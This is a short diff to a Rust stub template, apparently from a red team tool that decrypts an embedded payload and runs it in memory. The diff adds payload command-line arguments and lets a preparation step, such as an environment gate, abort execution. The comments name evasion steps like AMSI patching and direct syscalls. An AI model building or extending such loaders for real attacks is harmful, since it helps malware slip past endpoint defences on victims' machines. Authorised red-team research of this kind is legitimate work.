@@ -2,7 +2,9 @@
 //!
 //! Decrypts the embedded payload with XChaCha20-Poly1305, reports its per-build
 //! marker on stderr, and runs the payload in memory using the selected execution
-//! technique. Part of a red team research tool; not code for malicious use.
+//! technique. The payload receives a command line built from `build.payload.args`
+//! plus the args the operator passes to this binary. Part of a red team research
+//! tool; not code for malicious use.
 
 use chacha20poly1305::{
     aead::{Aead, KeyInit},
@@ -74,8 +76,13 @@ fn run() -> Result<i32, String> {
 
     // 5. Run the Preparation techniques (process-state modifications, e.g.
     //    patching AMSI). `run_preparations` is assembled from the active
-    //    preparation fragments.
-    run_preparations()?;
+    //    preparation fragments; it returns `false` when one of them (e.g. the
+    //    `bouncer` environment gate) decided to abort before the payload runs.
+    if !run_preparations()? {
+        // A preparation declined the host. Exit without touching the payload;
+        // the technique already chose its own exit behaviour (silent vs exit 1).
+        std::process::exit(0);
+    }
 
     // 6. Run the payload with the selected Execution technique.
     //    `execute_payload` is provided by the active execution fragment.
@@ -87,6 +94,9 @@ $PREPARATION_BLOCKS$
 
 // --- Syscall layer (injected; no-op unless build.stub.syscalls is set) ---
 $SYSCALLS_BLOCK$
+
+// --- Payload arguments (injected; shared by the execution techniques) ---
+$ARGS_BLOCK$
 
 // --- Payload import resolution (injected; shared by the execution techniques) ---
 $IMPORTS_BLOCK$
